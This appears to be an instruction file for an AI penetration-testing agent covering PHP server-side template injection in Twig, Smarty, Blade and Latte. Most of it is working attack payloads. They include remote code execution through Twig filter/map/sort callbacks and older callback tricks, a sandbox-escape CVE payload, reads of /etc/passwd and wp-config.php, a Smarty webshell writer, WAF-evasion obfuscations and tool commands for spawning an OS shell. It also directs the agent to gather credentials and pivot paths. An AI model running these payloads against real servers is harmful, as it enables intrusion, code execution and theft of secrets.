---
name: ssti-twig
description: >
  Guide Twig/PHP server-side template injection exploitation during authorized
  penetration testing.
keywords:
  - Twig SSTI
  - PHP template injection
  - Smarty SSTI
  - Blade SSTI
  - Latte SSTI
  - "{{7*'7'}} returns 49"
  - Symfony template injection
  - Laravel template injection
  - PHP sandbox escape
tools:
  - burpsuite
  - sstimap
  - tplmap
opsec: medium
---

# Twig / PHP SSTI

You are helping a penetration tester exploit server-side template injection in a
PHP application. The target uses Twig (Symfony), Smarty, Blade (Laravel), or
Latte and processes attacker-controlled input through the template engine without
proper sanitization. The goal is to escalate from template expression evaluation
to remote code execution or file access. All testing is under explicit written
authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[ssti-twig] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Confirmed template expression evaluation: `{{7*7}}` returns `49`
- If `{{7*'7'}}` returns `49`, the engine is Twig. If it returns `7777777`,
  route to **ssti-jinja2**.
- If `{$smarty.version}` returns a version number, the engine is Smarty.
- If `{var $X="POC"}{$X}` works with single-brace syntax, check for Latte.

## Step 1: Assess

If not already provided, determine:
1. **Framework** — Symfony, Laravel, CraftCMS, Grav, or custom
2. **Template engine** — Twig, Smarty, Blade, Latte
3. **Engine version** — critical for payload selection (Twig < 1.20, 1.x, 2.x, 3.x)
4. **Injection point** — URL param, form field, email template, PDF generation

Skip if context was already provided.

## Step 2: Engine Identification

### Twig (Symfony/CraftCMS/Grav)

```php
{{7*7}}          # 49
{{7*'7'}}        # 49 (arithmetic, not string repetition = Twig, not Jinja2)
{{dump(app)}}    # Dumps the application object (Symfony)
{{dump(_context)}}  # Dumps all template variables
{{app.request.server.all|join(',')}}  # Server variables
```

### Smarty

```php
{$smarty.version}    # Version disclosure
{system('id')}       # Direct code execution (v3, deprecated in v5)
{php}echo `id`;{/php}  # Deprecated in v3
```

### Blade (Laravel)

```php
{{ 7*7 }}        # 49 (Blade uses {{ }} for escaped output)
{!! 7*7 !!}      # 49 (unescaped output)
```

### Latte

```php
{var $X="POC"}{$X}   # Variable assignment and output
{php system('id')}    # Direct code execution
```

## Step 3: Information Extraction (Twig)

### Application Info

```php
{{_self}}                        # Reference to current template
{{_self.env}}                    # Twig environment object
{{app.request.server.all|join(',')}}  # All server variables
{{dump(_context)}}               # All template variables
```

### File Reading

```php
{{ '/etc/passwd'|file_excerpt(1,30) }}
{{ include("wp-config.php") }}
{{ source('/etc/passwd') }}
```

## Step 4: RCE — Twig

### filter() / map() / sort() / reduce() (Twig >= 2.x, 3.x)

These are the most reliable modern payloads:

```php
{{ ['id']|filter('system') }}
{{ ['id']|map('system')|join }}
{{ ['id',1]|sort('system')|join }}
{{ [0]|reduce('system','id') }}
{{ ['id']|filter('passthru') }}
{{ ['id']|map('passthru') }}
```

**With space or special character bypass:**

```php
{{ ['cat\x20/etc/passwd']|filter('system') }}
{{ ['cat$IFS/etc/passwd']|filter('system') }}
```

### registerUndefinedFilterCallback (Twig <= 1.19)

```php
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}

{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("whoami") }}
```

### call_user_func (Twig >= 1.41 / >= 2.10 / >= 3.0)

```php
{{ {'id':'shell_exec'}|map('call_user_func')|join }}
```

### Error suppression for automation

```php
{{ ["error_reporting", "0"]|sort("ini_set") }}
```

### Via Symfony request object

```php
# Email parameter passing FILTER_VALIDATE_EMAIL:
"{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
# With GET param: ?0=id
```

## Step 5: Blind / Error-Based SSTI (Twig)

### Error-Based RCE (<= 1.19)

```php
{{ _self.env.registerUndefinedFilterCallback("shell_exec") }}
{%include ["Y:/A:/", _self.env.getFilter("id")]|join%}
```

### Error-Based RCE (>= 1.41 / >= 2.10 / >= 3.0)

```php
{{ [0]|map(["xx", {"id": "shell_exec"}|map("call_user_func")|join]|join) }}
```

### Boolean-Based RCE (<= 1.19)

```php
{{ _self.env.registerUndefinedFilterCallback("shell_exec") }}
{{ 1/(_self.env.getFilter("id && echo UniqueString")|trim('\n') ends with "UniqueString") }}
```

### Boolean-Based RCE (>= 1.41 / >= 2.10 / >= 3.0)

```php
{{ 1/({"id && echo UniqueString":"shell_exec"}|map("call_user_func")|join|trim('\n') ends with "UniqueString") }}
```

### Sandbox bypass via CVE-2022-23614

```php
{{ 1 / (["id >>/dev/null && echo -n 1", "0"]|sort("system")|first == "0") }}
```

## Step 6: RCE — Other PHP Engines

### Smarty (< v5)

```php
{system('id')}
{system('cat /etc/passwd')}
```

Smarty v3 with `{php}` tag (deprecated):
```php
{php}echo `id`;{/php}
```

Write webshell (if write access):
```php
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### Blade (Laravel)

Blade escapes output by default. Exploitation requires unescaped output context
or framework-level misconfiguration:

```php
{{ system('id') }}    # Only if developer disabled escaping
```

### Latte

```php
{php system('id')}
```

## Step 7: Obfuscation / Filter Bypass (Twig)

### String construction via block + charset

```twig
{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
```

### Using _context variable (requires double-rendering)

```twig
{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}
```

### Filename injection via offset

```python
FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}
```

### Smarty obfuscation (using `cat` modifier)

```php
{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}
```

## Step 8: Escalate or Pivot

## OPSEC Notes

- SSTI payloads execute server-side — appear in application logs and error logs
- `system()` / `exec()` / `passthru()` create process artifacts
- Twig `filter('system')` payloads are short and less likely to trigger WAF
- Smarty `{system()}` is very obvious — prefer Twig-style if both are available
- Cleanup: no persistent artifacts unless you wrote files (webshell, config)

## Troubleshooting

### `filter('system')` Returns Empty

- PHP `disable_functions` in php.ini may block `system()`, `exec()`, `passthru()`
- Try alternatives: `shell_exec`, `popen`, `proc_open`
- Check: `{{ ['phpinfo()']|filter('assert') }}` to see disabled functions
- Try `{{ ['cat /etc/passwd']|filter('system') }}` vs `{{ ['id']|map('passthru') }}`

### registerUndefinedFilterCallback Not Available

- Only works in Twig <= 1.19 — check version with `{{ constant('Twig\\Environment::VERSION') }}`
- For Twig 2.x/3.x, use `filter()`, `map()`, `sort()`, or `reduce()`

### Twig Sandbox Enabled

- Sandbox restricts available filters, functions, and methods
- Check for CVE-2022-23614 (sandbox bypass via `sort`)
- Try `{{ dump(_context) }}` to see what's available in the sandbox
- Try accessing `_self.env` — some sandbox configs don't restrict it

### WAF Blocking Payloads

- Use hex escapes: `\x20` for space, `\x2f` for `/`
- Use `$IFS` as shell space substitute in commands
- Twig `map` payloads are typically shorter and less flagged than `filter`
- Try splitting payload across multiple parameters

### Automated Tools

```bash
# SSTImap
python3 sstimap.py -u 'https://TARGET/page?name=test' -s

# tplmap
python2.7 tplmap.py -u 'https://TARGET/page?name=test*' --os-shell

# TInjA
tinja url -u "https://TARGET/page?name=test"
```
